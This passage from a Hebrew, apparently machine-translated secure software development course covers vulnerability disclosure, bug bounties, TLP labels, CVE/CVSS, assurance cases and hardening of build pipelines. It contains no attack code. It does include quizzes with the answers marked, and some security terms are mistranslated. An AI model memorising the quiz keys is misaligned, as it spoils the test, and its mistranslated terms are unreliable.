עליך גם להשתמש בהצפנה כדי לתקשר בין מפתחי המפתח אם אינך רוצה שהתוקפים יידעו על מה שקורה. עם זאת, היזמים לעתים קרובות מכירים אחד את השני, אז זה בדרך כלל הרבה יותר קל להשיג.

#### נטר פגיעויות, כולל יחסי תלות פגיעים

כפי שכבר הזכרנו, לפקח על פגיעויות על התוכנה שלך וכל הספריות מוטבע בו. אתם יכולים להשתמש בהתראות של Google כדי להתריע על התוכנה שלכם ממקורות חדשות שונים. השתמש בכלי ניתוח הרכב תוכנה (SCA) / ניתוח מקור כדי להתריע בפניך על פגיעויות חדשות הידועות לציבור בתלות שלך.

כפי שצוין קודם לכן, שטר חומרים של תוכנה (SBOM) הוא מלאי מקונן המזהה את רכיבי התוכנה המרכיבים פיסת תוכנה גדולה יותר. כאשר SBOM זמין עבור רכיב שבו אתה משתמש, לעתים קרובות קל יותר להשתמש בנתונים אלה כדי לסייע בזיהוי פגיעויות ידועות. למערכות אקולוגיות רבות יש פורמטים ספציפיים למערכת האקולוגית של SBOM. ישנם גם כמה פורמטים של SBOM התומכים במערכות אקולוגיות שרירותיות: [חילופי נתונים של חבילת תוכנה (SPDX),](https://spdx.dev/) [מזהה תוכנה (SWID)](https://csrc.nist.gov/Projects/Software-Identification-SWID/) ו[- CycloneDX](https://github.com/CycloneDX/specification).

#### שקול ליצור תוכנית באגים באונטי

טכניקה נפוצה לעידוד דיווח על פגיעויות היא *תוכנית באגים*, שבה אתה משלם לכתבים כדי לדווח על פגמים חשובים במיוחד. זו יכולה להיות דרך חסכונית לעודד אנשים לדווח לך על פגיעויות לאחר שכל הפגיעויות "הקלות למציאה" יחסית אותרו ותוקנו. אם אתה לא רוצה לנהל תוכנית כזו בעצמך, יש חברות שונות שיכולות לעשות את זה בשבילך תמורת תשלום.

הקפד לקבוע בבירור את ההיקף והתנאים של כל תוכניות שפע באגים ([גילוי פגיעות OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). ציין על מה תשלם, כולל טווח מינימלי ומקסימלי. לדוגמה, *"$X-$Y עבור פגיעות שמובילה ישירות לביצוע קוד מרחוק ללא צורך באישורי כניסה."*  אם יש מקסימום שאתה יכול להוציא בשנה, אמור זאת, וציין את הסכום הכולל, את לוח השנה שבו נעשה שימוש, ומה יקרה לדוחות לאחר ניצול המימון השנתי. כמו כן, הבהירו מי אינו כשיר, למשל, מפתחי התוכנה ו/או עובדי החברות המפתחות את התוכנה.

עם זאת, היזהרו: תוכנית באגים יכולה להיות בזבוז כסף מדהים, אלא אם כן קל למצוא נקודות תורפה ולתקן תחילה. כפי שציינה קייטי מוסוריס, "לא כל הבאגים *נוצרים שווים"*; פגמים רבים (כגון רוב הפגמים ב-XSS) קלים לזיהוי ולתיקון, ו*"אתם צריכים למצוא את הבאגים האלה בקלות גם בעצמכם".*  שימוש בתוכנת באגים כדי למצוא נקודות תורפה קלות לאיתור הוא יקר ביותר ו*"אינו ניהול סיכונים מתאים".*  היא אפילו ציינה מקרה שבו חברה שילמה בסופו של דבר לחוקר אבטחה 29,000 דולר לשעה כדי למצוא פגמים פשוטים וידועים. מצא ותקן תחילה את הבאגים הפשוטים, *ואז* תוכנית שפע באגים עשויה להיות הגיונית ([*הסתמכות על באגים 'לא ניהול סיכונים מתאים': קייטי מוסוריס, *](https://www.zdnet.com/article/relying-on-bug-bounties-not-appropriate-risk-management-katie-moussouris/)מאת סטילגריאן, 2019).

### הגב לפגיעות ותקן אותה בזמן

כמובן, לאחר קבלת דוח פגיעות, יש להגיב אליו ולתקן אותו בזמן. OWASP ממליץ על הדברים הבאים ([גילוי פגיעות OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)):

* הגב לדוחות בציר זמן סביר.

* תקשרו בפתיחות עם החוקרים.

* [לעשות] לא לאיים בנקיטת צעדים משפטיים נגד חוקרים.

עליך להיות מסוגל לבצע טריאז' מהיר של דוחות פגיעות; דוחות מסוימים לא יחולו על התוכנה שלך או שאינם באמת פגיעויות. זה די נפוץ צריך לשאול שאלות נוספות כדי להבין באמת את הפגיעות.

#### תיקון הפגיעות

לאחר שקבעת שזו באמת נקודת תורפה, תצטרך לתקן אותה.

אם ברצונך להיות מסוגל לדון בדוחות בקבוצה מוגבלת - ורוב הקבוצות עושות זאת - עליך להגדיר זאת מראש.

ודא שאתה יכול להקים במהירות סביבת בדיקה עובדת עבור כל גרסה וסביבה נתמכת של התוכנה. אז ודא שיש לך בקרת גרסאות טובה של קוד המקור, וגם ודא שאתה יכול לעמוד במהירות בסביבות הפיתוח והבדיקות.

בעת תיקון פגיעות אבטחה, בדוק אם אותו סוג של פגיעות קיים במצבים דומים בתוכנה. אחרת, אתה בסופו של דבר ליצור תיקונים רבים יותר.

אם העדכון שלך גורם לבעיות, אנשים ידחו אותו וילמדו לא לקבל ממך עדכונים עתידיים. כל תיקון מוצע חייב למנוע חוסר תאימות לאחור אם בכלל אפשרי. זה חייב להיות גם באיכות גבוהה. משמעות הדבר היא  שאתה צריך חבילת בדיקות *אוטומטית* חזקה  לפני שאתה משחרר את התוכנה, ויש לך את כל החומרה הדרושה כדי לבצע את זה (אם הבדיקות צריך חומרה מיוחדת). הוסף בדיקות אוטומטיות הקשורות למה שאתה משנה, הן כדי להבטיח שזה באמת פותר את הבעיה וגם כדי לוודא שהשינוי אינו משפיע לרעה על שום דבר אחר.

![טקסט חלופי של תמונה](worst.png)

**הדבר הגרוע ביותר שיכול לקרות**, שאוחזר מ- [xkcd.com](https://xkcd.com/2261/), מורשה תחת [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

#### הגבלת הגילוי ופרוטוקול הרמזור הראשון (TLP)

כאשר דנים בפגיעות, לעתים קרובות חשוב לדון במידע מפורט, אך בו זמנית לומר לאנשים להגביל את החשיפה של מידע מסוים למשך פרק זמן מסוים. בנוסף, זה הפך להיות נפוץ שיש מספר צדדים שונים המעורבים בפגיעות: ייתכן שיהיו מספר ספקים (כולל ספקים) המיישמים תוכנה עם הפגיעות, מפיצים וארגונים המעורבים בהפצת מידע על הפגיעות.

FIRST פיתחה מערכת סימון פשוטה עבור זה שנקרא [פרוטוקול רמזור](https://www.first.org/tlp/) (TLP) המשמש לעתים קרובות כדי לציין למי ניתן לשתף את המידע. הנה סיכום קצר. ל- TLP יש ארבעה ערכי צבע לציון גבולות שיתוף, הממוקמים באופן הבא:

1. בדואר אלקטרוני: צבע ה- TLP נמצא בשורת הנושא וגם בגוף לפני המידע המיועד.

2. במסמכים: צבע ה- TLP נמצא בכותרת העליונה ובכותרת התחתונה של כל עמוד, בדרך כלל כשהוא מיושר לימין.

צבע ה- TLP מוצג באותיות גדולות אחרי "**TLP:", כך שתראה ** TLP:RED, TLP:AMBER, ** TLP  **:GREEN או ******TLP**:**WHITE.** לצבעים אלה יש את המשמעות הבאה:

* **TLP:RED** = לא לגילוי נאות, מוגבל למשתתפים בלבד.

* **TLP:AMBER** = גילוי מוגבל, מוגבל לארגוני המשתתפים.

* **TLP:GREEN** = גילוי מוגבל, מוגבל לקהילה.

* **TLP:WHITE**  = הגילוי אינו מוגבל.



#### קבל CVE וחשב CVSS

עליך לבקש CVE במידת הצורך והוא עדיין לא התבקש ([גילוי פגיעות OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). בדרך כלל, היית מתחיל תהליך זה לאחר שווידאת שהדוח הוא באמת פגיעות, ולכן היית עושה זאת בו-זמנית עם תיקונו. אם אתה מבקש CVE, עליך לחשב גם את ציון מערכת ניקוד הפגיעות הנפוצה (CVSS) של הפגיעות. CVSS הוא הערכה גסה של חומרת פגיעות.

הסיבה ל-CVEs ול-CVSS היא פשוטה: ארגונים מוצפים בעדכוני תוכנה, והם זקוקים למידע שיעזור להם לתעדף עדכונים. CVE ו- CVSS אינם מושלמים, אך הם נמצאים בשימוש נרחב ותלויים בהם.  סקר [*העלויות וההשלכות של פערים בתגובות לפגיעות*](https://www.servicenow.com/lpayr/ponemon-vulnerability-survey.html) (2019) של מכון Ponemon מצא כי:

* *"כמעט מחצית מהמשיבים (48%) מדווחים כי לארגונים שלהם הייתה דליפת מידע אחת או יותר בשנתיים האחרונות".*

* *"60% מקורבנות ההפרה אמרו שהם נפרצו בגלל [a] פגיעות ידועה שבה התיקון לא הוחל"*

* *"ניקוד CVSS... הוא לעתים קרובות המדד היחיד של תעדוף תיקונים [למרות שזה] משאיר בחוץ את קריטיות הנכסים והמערכות כחלק מתגובת הפגיעות."*

* *"44% מהמשיבים אומרים שהארגונים שלהם משתמשים באוטומציה כדי לסייע בניהול פגיעויות ותיקון [(בעיקר תעדוף ותיקון)]"*

* *"אוטומציה מפחיתה את הזמן להגיב לפגיעויות... 80% מהארגונים... שמשתמשים באוטומציה אומרים שיש להם את היכולת להגיב לפגיעויות במסגרת זמן קצרה יותר".*  עם זאת, אוטומציה זו תלויה במגוון גורמים, כולל (ברוב המקרים) הקצאת CVE כאשר קיימת פגיעות.

CVSS נמצא בשימוש נרחב, מכיוון שיש צורך בתעדוף ברור, אך CVSS זוכה גם לביקורת נרחבת (לדוגמה, [*חומרת פגיעויות שבורות*](https://opensourcesecurity.io/2020/05/27/broken-vulnerability-severities/), מאת ג'וש ברסרס, 2020). גרסה חדשה של CVSS (מעבר לגרסה 3), או תחליף לה, עשויה להיות מפותחת ו/או להיות בשימוש נרחב בעתיד.

#### שחרר את העדכון וספר לעולם

לאחר שהתיקון מוכן, שחרר אותו. יהיה עליך לספר לעולם שהתוכנה קבועה, ולעשות כל שביכולתך כדי לעודד קליטה מהירה של הגרסה הקבועה. OWASP ממליצה לספקים לפרסם ייעוץ אבטחה ברור ויומני שינויים, וכן שהספקים יציעו אשראי למאתר הפגיעויות ([OWASP Vulnerability Disclosure Disclosure](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)).

אם יש דרכים לעקיפת הבעיה שניתן להחיל מבלי לעדכן את התוכנה, הקפד לציין אותן. זה חשוב במיוחד אם:

* סביר להניח שיהיו משתמשים רבים שלא יוכלו לעדכן את התוכנה שלהם, או

* הפגיעות ידועה לציבור, אך התיקון לא ישוחרר במשך זמן מה.

ודא שקל לעדכן באופן אוטומטי לגרסה הקבועה של התוכנה. אם פלטפורמת התוכנה שלך אינה מספקת מהדורות תיקון אוטומטיות או התקנה, שקול ליישם אחת מהן בעצמך. משתמשים צריכים להיות מסוגלים לקבל תיקונים במהירות ובאופן אוטומטי, אלא אם כן הם ביטלו במפורש את הסכמתם לעדכונים.

הקפידו תמיד לתת קרדיט ולהודות לכתבי פגיעות, אלא אם כן הם מבקשים אחרת. זה גס רוח לא לתת קרדיט, וכתבי פגיעות רבים מספקים דיווחים *בעיקר* כדי לקבל קרדיט. מה שגרוע יותר, כתבים עשויים להיות פחות משתפים פעולה בעתיד אם הם לא יקבלו אשראי מתאים.

#### חידון 4.1: להגיב ולתקן את הפגיעות בזמן

\>\>מה המשמעות של **TLP:RED**?<<

(!x) לא לגילוי, מוגבל למשתתפים בלבד.

( ) גילוי מוגבל, מוגבל לארגוני המשתתפים.

( ) גילוי מוגבל, מוגבל לקהילה.

( ) הגילוי אינו מוגבל.

### שליחת דוחות פגיעות לאחרים

לאחר שתסיים את הקורס הזה, יש סיכוי גבוה בהרבה שתוכל לזהות פגיעויות בתוכנה. ביחידה זו, נדון כיצד לשלוח דוחות פגיעות לאחרים.

 [גיליון רמאות גילוי הפגיעות של OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html) ממליץ לחוקרי אבטחה (שמוצאים פגיעויות אבטחה) לבצע:

* ודא שכל בדיקה היא חוקית ומאושרת.

* כבד את פרטיותם של אחרים.

* לעשות מאמצים סבירים כדי ליצור קשר עם צוות האבטחה של הארגון.

* ספק פרטים מספיקים כדי לאפשר אימות ושחזור של נקודות התורפה.

* לא לדרוש תשלום או תגמולים עבור דיווח על פגיעויות מחוץ לתוכנית באגים מבוססת.

דיווח על פגיעות שמצאת יכול להיות מסובך באופן מפתיע. אם יש ספק יחיד, אתה יכול לדווח רק לספק זה. אבל לפעמים יש מספר ספקים ובעלי עניין אחרים המעורבים. יש גם דרכים שונות שבהן תוכל לבחור לדווח על פגיעות.

#### מודלים לדיווח

ישנם מספר סוגים שונים של מודלים של גילוי:

1. **גילוי**<br> פרטי*"במודל הגילוי הפרטי, הפגיעות מדווחת באופן פרטי לארגון. הארגון יכול לבחור לפרסם את פרטי הפגיעויות, אך הדבר נעשה על פי שיקול דעתו של הארגון, ולא של החוקר, כלומר נקודות תורפה רבות לעולם לא יפורסמו לציבור. רוב תוכניות הבאגים דורשות מהחוקר לעקוב אחר מודל זה. הבעיה העיקרית במודל זה היא שאם הספק אינו מגיב, או מחליט לא לתקן את הפגיעות, ייתכן שהפרטים לעולם לא יפורסמו. מבחינה היסטורית זה הוביל לכך שלחוקרים נמאס מחברות שמתעלמות ומנסות להסתיר נקודות תורפה, מה שהוביל אותם לגישת הגילוי המלא". * ([גילוי פגיעות OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html))

2. **גילוי נאות**<br>*"עם גישת הגילוי המלא, הפרטים המלאים של הפגיעות מתפרסמים ברגע שהם מזוהים. משמעות הדבר היא שהפרטים המלאים (לעתים כולל קוד ניצול) זמינים לתוקפים, לעתים קרובות לפני שתיקון זמין. גישת הגילוי המלא משמשת בעיקר בתגובה לארגונים המתעלמים מפגיעויות שדווחו, כדי להפעיל עליהם לחץ לפתח ולפרסם תיקון. זה הופך את גישת הגילוי המלא לשנויה מאוד במחלוקת, והיא נתפסת כחסרת אחריות על ידי אנשים רבים. בדרך כלל יש להתייחס אליו רק כמוצא אחרון, כאשר כל השיטות האחרות נכשלו, או כאשר קוד ניצול כבר זמין לציבור"* ([גילוי פגיעות OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). סיבה נוספת לשקול גילוי מלא היא אם יש סיבה להאמין שהספק זדוני במכוון; דיווח על פגיעות לספק זדוני בלבד נותן לספק הזדוני זמן רב יותר לנצל את הפגיעות.

3. **גילוי מתואם (שנקרא היסטורית גילוי אחראי)**גילוי <br>מתואם *"מנסה למצוא דרך ביניים סבירה בין שתי הגישות הללו. ... הדו"ח הראשוני נעשה באופן פרטי, אך הפרטים המלאים מתפרסמים לאחר שהתיקון הופך לזמין (לעיתים עם עיכוב כדי לאפשר זמן נוסף להתקנת התיקונים)". * ([גילוי פגיעות OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)). מבחינה היסטורית, זה נקרא *גילוי אחראי*, אבל זה מונח מוטה, והמטבע המקורי שלו ממליץ עכשיו לקרוא לזה גילוי מתואם במקום. **חשוב** שתהיה **מגבלת זמן** לפני שהפגיעות תיחשף באופן חד צדדי. ללא מגבלת זמן זה זהה למעשה לגילוי פרטי, שכן לספק עשוי להיות תמריץ קטן לתקן את הפגיעות.

4. **גילוי לתוקפים**<br>חלק מהחוקרים עובדים עבור ארגונים שתוקפים מערכות של אחרים. חוקרים אחרים מוכרים נקודות תורפה לארגונים כאלה, או למתווכים שמוכרים את נקודות התורפה. פעולה זו שנויה במחלוקת, במיוחד כאשר הם נמכרים למתווכים שאינם חושפים בבירור מי קונה את נקודות התורפה. ההשפעה של זה משתנה, כי יש מגוון גדול בארגונים שמשלמים על פגיעויות. ארגונים אלה כוללים אכיפת חוק במדינות שונות, צבאות במדינות שונות, פשע מאורגן ו/או קבוצות טרור. כל מי שמספק פגיעויות לתוקפים צריך לשקול את ההשלכות האתיות. בפרט, עליך לשקול מה התוקפים צפויים לעשות עם פגיעויות אלה. האם יש לך ביטחון שהתוקפים לא ישתמשו בנקודות התורפה בניגוד לזכויות אדם? האם הם יפגעו באנשים או בקבוצות מסוימות כמו מיעוטים אתניים, מתנגדים פוליטיים או עיתונאים? אם אתה חושף פגיעויות לתוקפים, אתה תומך באופן שבו ארגונים אלה ישתמשו בפגיעויות אלה כדי לתקוף אחרים; אתה צריך להיות בטוח שהם ישתמשו בהם לתמיד.

מכאן והלאה נניח שאתם פועלים על פי *מודל גילוי מתואם* עם מסגרת זמן מוגבלת כלשהי.

מגבלות זמן הגילוי המתואמות (המכונה *תקופות אמברגו*) משתנות מאוד. מגבלת זמן זו היא משך הזמן שבין המועד שבו מדווח הכתב על הפגיעות לספק לבין המדווח יחשוף אותה באופן חד צדדי לציבור. באופן כללי, ספקים דוחפים למגבלות זמן ארוכות יותר או ללא מגבלות זמן, לעתים קרובות מכיוון שזה יוריד את העלויות שלהם (אולי לחינם אם הספק יכול להאריך את מגבלת הזמן כך שהספק לעולם לא יצטרך לתקן את הפגיעות). ארגונים האמונים על הגנה על הציבור וארגונים רב-מפלגתיים נוטים ללחוץ לקיצור מגבלות הזמן. חלק מהפגיעויות קלות יותר לתיקון מאחרות, מה שמקשה על בחירת מספרים פשוטים. הנה כמה דוגמאות למגבלות זמן של חשיפה ציבורית:

* [לינוקס-distros](https://oss-security.openwall.org/wiki/mailing-lists/distros): פחות מ 7 ימים מועדפים, עד 14 ימים מותר, עד 19 ימים אם חמישי / שישי לדווח על גילוי בימים שני / שלישי

* [oCERT:](http://ocert.org/) 14 ימים סטנדרטיים; 7 ימים אם טריוויאלי, 30 יום אם קריטי/מורכב, עד חודשיים "חריגים במיוחד"

* [CERT/CC](https://www.cert.org/vulnerability-analysis/vul-disclosure.cfm): 45 יום "ללא קשר לקיום... של תיקונים או דרכים לעקיפת הבעיה... נסיבות מקלות ... עלול לגרום לחשיפה מוקדמת או מאוחרת יותר... לא נפיץ ניצולים"

* [פרויקט גוגל זירו](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html): 90 יום.

#### מידע נוסף

מקור טוב למידע נוסף הוא[ "הנחיות ונהלים לתיאום וגילוי פגיעות מרובת משתתפים](https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1)" של FIRST. מבחינה היסטורית מסמכים רבים התמקדו בתיאום דו-צדדי פשוט בין חוקר אבטחה לספק תוכנה, אך כיום יש לעתים קרובות מורכבויות בשל הצורך בתיאום רב-צדדי. מסמך FIRST זה דן במצבים מורכבים יותר אלה, ומספק קווים מנחים לטיפול בהם.

## שונות

### מקרי הבטחה

למרבה הצער, אתה לא יכול לעשות רק דבר אחד ולהפוך את המערכת למאובטחת. במקום זאת, אתה צריך לעשות מגוון רחב של דברים. מעקב אחר הטכניקות השונות שאתה צריך לעשות, כדי להבטיח שאתה באמת מטפל בכל מה שאתה חושב שאתה צריך, יכול להיות מכריע... במיוחד אם התוכנה שלך גדלה או שיש ציפיות לאבטחה חזקה. בנוסף, לפעמים בעלי עניין פוטנציאליים (כגון משתמשים) רוצים להבין מה אתה עושה כדי לקבוע אם אתה עושה מספיק למטרות שלהם. רשימה לא מובנית של "*דברים שנעשו*" לא ממש עוזרת כשמערכת גדלה; אתה יכול לעשות הרבה דברים, אבל לא להתייחס למשהו חשוב.

חלופה מעשית היא יצירת *מקרה ביטחון*. מקרה ביטחון * "כולל טענה ברמה העליונה בגין תכונה של מערכת או מוצר (או קבוצת תביעות), טיעון שיטתי בנוגע לטענה זו, והראיות וההנחות המפורשות העומדות בבסיס טיעון זה"* ([ISO/IEC 15026-2:2011](https://www.iso.org/standard/52926.html)). בואו נסתכל על ההגדרה הזאת; במילים אחרות, מקרה הבטחה כולל:

* תביעות: תביעות ברמה העליונה עבור מאפיין של מערכת או מוצר. כלומר, משהו שאתה רוצה להיות אמיתי.

* טיעונים: טיעון שיטתי המצדיק טענה זו.

* ראיות/הנחות: ראיות והנחות מפורשות העומדות בבסיס הטיעון.

הנקודה של מקרה ביטחון היא שהוא *שיטתי.* במילים אחרות, עליכם להתחיל עם כל טענה שאתם רוצים לטעון שהיא חשובה, ולפרק אותה שוב ושוב כדי להראות שהטענה נכונה. תארו לעצמכם שאתם עורכי דין שמנסים להגיש טיעון בפני חבר מושבעים ספקן; התפקיד שלך הוא להצדיק את העובדה שהטענות(ות) נכונות. יצירת מקרה ביטחון עוזרת לך לקבוע ולהצדיק בפני אנשים שהתוכנה מאובטחת, הן לאחרים והן לעצמך.

מקרה ביטחון לא חייב להיות בצורה מסוימת. עם זאת, לעתים קרובות מדובר במסמכים עם איורים המציגים את המבנה ברמה גבוהה, וטקסט המספק את הפרטים. זה פשוט כי קל להציץ בדמויות כדי לראות איך הדברים עובדים יחד, אבל הטקסט מספק את הפרטים כדי להבין באמת דברים.

בואו נדבר על דרך אחת ליצור מקרה ביטחון, המבוסס על חומר מתוך [*תבנית מקרה אבטחת אבטחה לדוגמה*](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx) מאת דייוויד א. וילר (2018). נניח שיש לנו טענה כוללת: אנחנו רוצים לטעון ש"המערכת שלנו מאובטחת כראוי מפני איומים מתונים". בואו נטען שאנחנו יכולים לספק הוכחה מספקת לכך אם דרישות האבטחה שלנו מזוהות ונענות על ידי הפונקציונליות שלה, ושהאבטחה מיושמת על ידי תהליכי מחזור חיי המערכת. אנו יכולים לפרק את דרישות האבטחה עוד יותר למשולש דרישות האבטחה שלנו (סודיות, שלמות וזמינות), טיפול נכון בבקרת גישה, וזיהוי וטיפול בנכסים ובגורמי האיום. להלן איור המציג את הרמה העליונה של מקרה ביטחון:

![טקסט חלופי של תמונה](top_assurance_case.png)

**דוגמה לרמה העליונה של מקרה ביטחון**, מאת דייוויד א. וילר (2018)

לאחר מכן נוכל לפרק כל פריט שוב ושוב עוד יותר. לדוגמה, אנו עשויים לחלק את תהליכי מחזור החיים לתחומים כגון תכנון, יישום ואימות. לאחר מכן נוכל להסביר כיצד אנו מתייחסים לאבטחה בכל אחד מהם:

* לגבי עיצוב, אנו עשויים להראות שפעלנו על פי כל עקרונות העיצוב של Saltzer & Schroeder (S&S) שכבר דנו בהם.

* לצורך היישום, אנו עשויים להראות כי התמודדנו עם כל הפגיעויות "המובילות" שזוהו על-ידי רשימה מקובלת ורלוונטית של פגיעויות מובילות.

* לצורך אימות, אנו עשויים להראות שאנו משתמשים במגוון כלים כדי לזהות פגיעויות לפני הפצת התוכנה.

לדיון מפורט ולתבנית ליצירת מקרה ביטחון, ראה [*תבנית מקרה אבטחת אבטחה לדוגמה*](https://www.ida.org/-/media/feature/publications/a/as/a-sample-security-assurance-case-pattern/p-9278.ashx) מאת דייוויד א. וילר (2018). אם ברצונך לראות דוגמה ממשית, תוכל לראות את [מקרה הבטחת שיטות העבודה המומלצות של OpenSSF BadgeApp](https://github.com/coreinfrastructure/best-practices-badge/blob/master/doc/security.md).

מתי תסיים? התשובה הרגילה היא כאשר בעלי העניין מסכימים שזה מספיק. אם הם לא חושבים שזה מספיק, אז תשאלו אותם מה יספיק ואם הם מוכנים לשלם על השינויים האלה. אם הם לא משלמים לך מספיק, אז אתה לא צריך לעשות את זה.

מה שיפה במקרה הבטחה הוא שאם מישהו אחר כך רוצה לדעת "האם תוכנה זו מאובטחת כראוי", הוא יכול פשוט לבדוק את מקרה ההבטחה. פשוט *שיש* מקרה ביטחון מספק הרבה ביטחון, כי זה מראה שמישהו חשב דרך מה המערכת אמורה לעשות ויש לו טיעון סביר (עם ראיות) כי הטענות נכונות.

#### חידון 4.2: מקרי הבטחה

\>\>בחר את המשפטים הנכונים:<<

[!x] תביעה מתארת מאפיין חשוב שברצונך שיהיה נכון עבור מערכת או מוצר

[x] מקרה הבטחה צריך לפרק טענה שוב ושוב עד שתוכל להראות שהיא נכונה על ידי הצגת העובדה שכל חלק הוא נכון.

[x] באופן עקרוני, מקרה ביטחון מתעמק שוב ושוב עד שבעלי העניין מסכימים שנעשה מספיק (למשל, משום שהם לא מוכנים לשלם יותר).

### הקשחת סביבת הפיתוח (כולל Build ו-CI/CD Pipeline) וסביבת ההפצה

רוב ההתקפות מתרחשות כאשר מערכת נפרסת, אך יותר ויותר תוקפים תוקפים מערכות במהלך הפיתוח וההפצה שלהן. לענייננו, "סביבת הפיתוח" כוללת את כל המכונות ותשתיות אחרות המשמשות לפיתוח התוכנה, כולל המערכות של כל מפתח, מערכות בקרת גרסאות, מערכות בנייה, צינורות CI/CD וכן הלאה.  "סביבת ההפצה" היא הסביבה המשמשת להפצת התוכנה שנבנתה כתוצאה מכך, לדוגמה, רישומי חבילות / מאגרים, רישומי מכולות / מאגרים וכן הלאה. חשוב לאבטח את סביבת הפיתוח וסביבת ההפצה מפני גישה לא מורשית או סכנה. זה כולל הגנה עליהם מפני הכנסת קוד זדוני. נניח שהתוקפים מנסים לחתור תחת כל מערכת המשמשת לפיתוח או הפצה של תוכנה, במיוחד כל מערכת משותפת.

ראשית, צמצם את ההרשאות. הגבל את האנשים שיכולים לשלוט בסביבות אלה, ובכמה. אם מישהו עוזב פרוייקט ו/או ארגון, הסר את ההרשאות שלו; גם אם הם לא יתקפו, תוקף עלול לרכוש את האישורים שלהם. הגבל את ההרשאות שניתנו לסביבות, לדוגמה, אם צינור CI/CD מקבל אסימון אימות, ספק אסימון עם ההרשאות המינימליות הדרושות כך שאם האסימון חשוף הנזק יופחת. אם אסימון נחוץ רק במקרים מסוימים (כגון רק בעת עיבוד ענפים מסוימים כמו "ראשי"), ספק את האסימון רק במקרים אלה.

גישה פשוטה אחת היא לבקש ממפתחים להשתמש באסימוני אימות רב-גורמי (MFA) (המכונים מפתחות) בעת גישה לסביבות פיתוח. מדובר במכשירי חומרה שמוכיחים שהמפתח מחזיק במכשיר, ומכיוון שהם חד-תכליתיים קשה לתוקפים לחתור תחתיהם. אם עליך להשתמש בסיסמאות, ודא שהן ארוכות ואינן משותפות בין אנשים.

שקול להשתמש ב"הגנת ענף" או דומה, אם מערכת בקרת הגירסאות שלך תומכת בכך, כדי להגביל פעולות שיכולות להתרחש בענפים מסוימים (כגון "ראשי"). לדוגמה, באפשרותך לוודא שבקשת מיזוג/בקשת משיכה זכתה לבדיקה אנושית ושהיא עברה בדיקות אוטומטיות לפני שניתן יהיה לקבל את השינוי המוצע. ענפים מוגנים יכולים גם למנוע פעולות מסוכנות כגון דחיפות כוח, החלפות של היסטוריות ביצוע ושינויים דומים.

היכן שהם מעשיים, הקשיחו את סביבת הפיתוח ואת סביבת ההפצה כך שיהיה קשה יותר לתקוף אותם. בפרויקטים רבים, חלקים רבים או כולם של סביבות אלה מתארחים במקום אחר (לעתים קרובות בענן); ודא שלמערכת המארחת שבחרת יש אבטחה מספקת. לאחר שנבחר, עיין בתיעוד של המערכות שבהן אתה משתמש והגדר אותן כדי למקסם את האבטחה, לדוגמה, כדי למזער הרשאות המוענקות לאחרים. לדוגמה, אם אתה משתמש ב-  GitHub, עיין [בתיעוד של GitHub בנושא אבטחת המאגר שלך](https://docs.github.com/en/code-security/getting-started/securing-your-repository). אם יש לך התקנת [ GitLab, עיין בתיעוד של GitLab על אבטחת ההתקנה שלך ("אבטחה").](https://docs.gitlab.com/ee/security/)

תהליך הבנייה צריך להיות סקריפט/אוטומטי לחלוטין. בדרך זו הבנייה תבוצע באופן צפוי בכל פעם. במידת האפשר, מערכת הבנייה צריכה לספק מידע מקור, כלומר, לרשום אילו רכיבים נכללו בבנייה ובאופן אידיאלי אילו רכיבים שימשו לביצוע הבנייה. היזהר בעת רישום תהליך בנייה; לעתים קרובות אתה רוצה להימנע מלהקליט בקבצי יומן כל סודות כמו אסימוני אימות פעילים.

תהליכי בנייה, אימות והפצה (כולל צינורות CI/CD) מביאים לעתים קרובות רכיבי תוכנה רבים אחרים הניתנים לשימוש חוזר. הקפד ליישם את שיטות העבודה המומלצות הנדונות בסעיפי הקורס בנושא (1) בחירה (הערכה) של תוכנות [קוד פתוח](#selecting-evaluating-open-source-software) ו- (2) [הורדה והתקנה של תוכנות הניתנות לשימוש חוזר](#downloading-and-installing-reusable-software).

רמות שרשרת אספקה עבור תוצרי תוכנה, או SLSA ("סלסה"), היא מסגרת אבטחה המפותחת כרשימת תיוג של תקנים ובקרות למניעת חבלה, שיפור השלמות ואבטחת חבילות ותשתיות. בזמן כתיבת שורות אלה הוא עדיין בפיתוח, אבל אתה צריך לשקול את ההמלצות שלה. SLSA מפותחת תחת קרן אבטחת הקוד הפתוח (OpenSSF). לקבלת מידע נוסף, עיין בדף הבית של SLSA בכתובת <https://slsa.dev/>.

מקור נוסף לרעיונות טובים על הקשחת סביבות פיתוח מפני התקפה, כמו גם גישות רבות אחרות לשיפור האבטחה, נמצאים [בשיטות עבודה מומלצות של שרשרת אספקת תוכנה](https://github.com/cncf/tag-security/raw/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf) מקרן המחשוב המקומית בענן (CNCF).

אם תוקף מצליח לחתור תחת תהליך הבנייה, לעתים קרובות קשה לזהות את התוצאות החתרניות. אמצעי נגד חזק להתקפה זו הוא מבנה מאומת הניתן לשחזור. גירסת Build ניתנת לשחזור "אם ניתן קוד מקור, סביבת בנייה והוראות בנייה, כל צד יכול ליצור מחדש עותקים זהים של כל הממצאים שצוינו" (כמוגדר ב"[הגדרות" מפרויקט Reproducible](https://reproducible-builds.org/docs/definition/) Builds). בנייה הניתנת לשחזור נקראת גם בנייה דטרמיניסטית. גירסת Build הניתנת לשחזור מאומתת היא פשוט גירסת Build שאומתה באופן עצמאי כגרסת Build הניתנת לשחזור (במחשבים שונים). גירסאות Build מאומתות הניתנות לשחזור הופכות את תקיפת תהליך הבנייה לקשה הרבה יותר, מכיוון שהתוקף חייב לחתור תחת מספר מערכות בנייה עצמאיות כדי לחתור בהצלחה תחת בניית התוכנה.

